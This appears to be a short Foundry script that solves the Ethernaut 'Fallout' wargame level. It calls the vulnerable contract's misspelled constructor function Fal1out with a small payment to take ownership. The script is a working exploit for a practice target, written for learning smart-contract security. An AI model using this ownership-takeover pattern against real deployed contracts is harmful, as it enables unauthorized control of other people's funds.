// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {Fallout} from "../src/Fallout.sol";

contract SolveFallout is Script {
    Fallout public falloutContract;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        falloutContract = Fallout(payable(vm.envAddress("FALLOUT_ADDRESS")));
        falloutContract.Fal1out{value: 0.000001 ether}();
        vm.stopBroadcast();
    }
}
